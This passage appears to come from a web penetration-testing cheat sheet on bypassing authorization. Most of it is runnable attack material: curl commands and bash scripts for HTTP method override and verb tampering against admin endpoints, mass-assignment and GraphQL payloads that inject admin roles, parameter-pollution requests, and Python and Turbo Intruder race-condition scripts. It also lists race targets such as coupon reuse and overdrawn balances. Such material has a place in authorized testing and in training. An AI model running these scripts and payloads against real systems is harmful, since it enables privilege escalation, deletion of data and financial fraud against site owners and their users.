---

## HTTP Method Override Headers

When direct HTTP verb tampering is blocked, use override headers that many frameworks honor:

### Override Headers (try all)
```bash
# Standard override headers
curl -X POST "http://target.com/admin/delete?user=carlos" \
  -H "X-HTTP-Method-Override: DELETE"

curl -X POST "http://target.com/admin/delete?user=carlos" \
  -H "X-Method-Override: PUT"

curl -X POST "http://target.com/admin/delete?user=carlos" \
  -H "X-Original-Method: PATCH"

curl -X GET "http://target.com/admin" \
  -H "X-HTTP-Method: POST"
```

### _method Parameter Override
Many frameworks (Rails, Laravel, Express) support method override via form parameter:
```bash
# In URL query string
curl "http://target.com/admin/users/1?_method=DELETE"

# In POST body
curl -X POST "http://target.com/admin/users/1" \
  -d "_method=PUT&role=admin"

# In JSON body
curl -X POST "http://target.com/api/admin/users/1" \
  -H "Content-Type: application/json" \
  -d '{"_method": "DELETE", "id": 1}'
```

### Framework-Specific Override Parameters
```
Rails:     _method=DELETE
Laravel:   _method=PUT
Express:   _method=PATCH (with method-override middleware)
Spring:    _method=DELETE (with HiddenHttpMethodFilter)
Django:    X-HTTP-Method-Override header
ASP.NET:   X-HTTP-Method-Override header
```

### Complete Override Test Script
```bash
#!/bin/bash
TARGET="$1"  # e.g., http://target.com/admin/action
COOKIE="$2"  # e.g., session=abc123

echo "[*] Testing method override on $TARGET"

# Test override headers with POST base method
for header in "X-HTTP-Method-Override" "X-Method-Override" "X-Original-Method" "X-HTTP-Method" "X-Original-URL" "X-Rewrite-URL"; do
  for method in "GET" "PUT" "DELETE" "PATCH"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET" \
      -H "$header: $method" -H "Cookie: $COOKIE")
    if [ "$CODE" != "403" ] && [ "$CODE" != "405" ] && [ "$CODE" != "401" ]; then
      echo "  [+] POST + $header: $method → HTTP $CODE"
    fi
  done
done

# Test _method parameter
for method in "GET" "PUT" "DELETE" "PATCH" "OPTIONS" "HEAD"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET" \
    -d "_method=$method" -H "Cookie: $COOKIE")
  if [ "$CODE" != "403" ] && [ "$CODE" != "405" ] && [ "$CODE" != "401" ]; then
    echo "  [+] POST + _method=$method → HTTP $CODE"
  fi
done
```

---

## Comprehensive Verb Tampering Script

Tests ALL HTTP methods including WebDAV verbs against a target endpoint:

```bash
#!/bin/bash
# Comprehensive HTTP verb tampering test
TARGET="${1:?Usage: $0 <url> [cookie]}"
COOKIE="${2:-}"
COOKIE_HEADER=""
[ -n "$COOKIE" ] && COOKIE_HEADER="-H Cookie: $COOKIE"

echo "[*] Verb tampering test: $TARGET"
echo "────────────────────────────────────────"

# Standard HTTP methods
for METHOD in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT; do
  RESP=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
    -X "$METHOD" "$TARGET" $COOKIE_HEADER --max-time 10 2>/dev/null)
  CODE=$(echo "$RESP" | cut -d: -f1)
  SIZE=$(echo "$RESP" | cut -d: -f2)
  if [ "$CODE" != "405" ] && [ "$CODE" != "501" ] && [ "$CODE" != "000" ]; then
    echo "  [+] $METHOD → HTTP $CODE ($SIZE bytes)"
  else
    echo "  [-] $METHOD → HTTP $CODE"
  fi
done

# WebDAV methods
echo ""
echo "[*] WebDAV methods:"
for METHOD in PROPFIND PROPPATCH MKCOL COPY MOVE LOCK UNLOCK SEARCH; do
  RESP=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
    -X "$METHOD" "$TARGET" $COOKIE_HEADER --max-time 10 2>/dev/null)
  CODE=$(echo "$RESP" | cut -d: -f1)
  SIZE=$(echo "$RESP" | cut -d: -f2)
  if [ "$CODE" != "405" ] && [ "$CODE" != "501" ] && [ "$CODE" != "000" ]; then
    echo "  [+] $METHOD → HTTP $CODE ($SIZE bytes)"
  fi
done

# Method override via headers
echo ""
echo "[*] Method overrides (POST + header):"
for OVERRIDE in "X-HTTP-Method-Override: GET" "X-HTTP-Method-Override: DELETE" \
                "X-Method-Override: PUT" "X-Original-Method: DELETE"; do
  HEADER_NAME=$(echo "$OVERRIDE" | cut -d: -f1)
  HEADER_VAL=$(echo "$OVERRIDE" | cut -d: -f2 | xargs)
  RESP=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
    -X POST "$TARGET" -H "$OVERRIDE" $COOKIE_HEADER --max-time 10 2>/dev/null)
  CODE=$(echo "$RESP" | cut -d: -f1)
  SIZE=$(echo "$RESP" | cut -d: -f2)
  if [ "$CODE" != "403" ] && [ "$CODE" != "405" ] && [ "$CODE" != "401" ]; then
    echo "  [+] POST + $OVERRIDE → HTTP $CODE ($SIZE bytes)"
  fi
done
```

---

## ABAC Bypass Patterns

Attribute-Based Access Control can be bypassed through mass assignment and parameter pollution:

### Mass Assignment via JSON Body
```bash
# When updating profile, inject role/privilege fields
curl -X POST "http://target.com/api/user/profile" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=abc123" \
  -d '{"email":"new@email.com","role":"admin"}'

# Try various privilege field names
curl -X PATCH "http://target.com/api/user/me" \
  -H "Content-Type: application/json" \
  -d '{"isAdmin":true}'

curl -X PUT "http://target.com/api/user/settings" \
  -H "Content-Type: application/json" \
  -d '{"permissions":["read","write","admin","delete"]}'

# Common mass-assignable fields:
# role, isAdmin, is_admin, admin, permissions, scope, privilege,
# access_level, user_type, account_type, tier, group, groups,
# roleid, role_id, userRole, accessRole
```

### GraphQL Mutation Escalation
```graphql
# Normal profile update
mutation {
  updateProfile(input: {email: "new@email.com"}) {
    user { id email }
  }
}

# Inject role field in mutation
mutation {
  updateProfile(input: {email: "new@email.com", role: "ADMIN"}) {
    user { id email role }
  }
}

# Try introspection to find hidden fields
{
  __type(name: "UpdateProfileInput") {
    inputFields { name type { name } }
  }
}
```

### Parameter Pollution
```bash
# Duplicate parameters — server may use last value
curl "http://target.com/api/user?id=123&id=1"

# Mixed sources — query + body
curl -X POST "http://target.com/api/update?role=user" \
  -d "role=admin"

# Array injection
curl "http://target.com/api/user?role[]=user&role[]=admin"
```

---

## Race Conditions in Authorization

Exploit time-of-check-to-time-of-use (TOCTOU) gaps in authorization:

### Async Concurrent Request Script
```python
#!/usr/bin/env python3
"""Race condition tester — send concurrent requests to exploit TOCTOU gaps."""
import asyncio
import aiohttp
import sys

async def send_request(session, url, method="GET", data=None, headers=None, cookies=None):
    """Send a single request."""
    try:
        async with session.request(method, url, data=data, headers=headers, cookies=cookies) as resp:
            body = await resp.text()
            return resp.status, len(body), body[:200]
    except Exception as e:
        return 0, 0, str(e)

async def race_condition_test(url, method="GET", data=None, headers=None,
                               cookies=None, concurrent=20):
    """Send N concurrent requests to exploit race conditions."""
    print(f"[*] Sending {concurrent} concurrent {method} requests to {url}")

    async with aiohttp.ClientSession() as session:
        tasks = [
            send_request(session, url, method, data, headers, cookies)
            for _ in range(concurrent)
        ]
        results = await asyncio.gather(*tasks)

    # Analyze results
    status_counts = {}
    for status, size, body in results:
        key = f"HTTP {status} ({size}B)"
        status_counts[key] = status_counts.get(key, 0) + 1

    print(f"[*] Results:")
    for key, count in sorted(status_counts.items()):
        print(f"  {key}: {count}x")

    # Check for race condition indicators
    unique_statuses = len(set(s for s, _, _ in results))
    unique_sizes = len(set(sz for _, sz, _ in results))
    if unique_statuses > 1 or unique_sizes > 2:
        print(f"  [!] POSSIBLE RACE CONDITION: {unique_statuses} different statuses, {unique_sizes} different sizes")

    return results

async def main():
    url = sys.argv[1]
    method = sys.argv[2] if len(sys.argv) > 2 else "GET"
    n = int(sys.argv[3]) if len(sys.argv) > 3 else 20
    await race_condition_test(url, method=method, concurrent=n)

if __name__ == "__main__":
    asyncio.run(main())
```

### Common Race Condition Targets
```
- Coupon/discount code redemption (use same code multiple times)
- Account balance operations (withdraw more than available)
- Rate limiting (bypass by sending concurrent requests)
- Privilege checks during role changes
- File upload + processing (upload then access before validation)
- Email verification (verify then change email simultaneously)
```

### Single-Packet Attack (Burp Turbo Intruder)
```python
# Turbo Intruder script for single-packet attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)

    # Queue 20 identical requests
    for i in range(20):
        engine.queue(target.req)

    # Send all in single TCP packet
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```
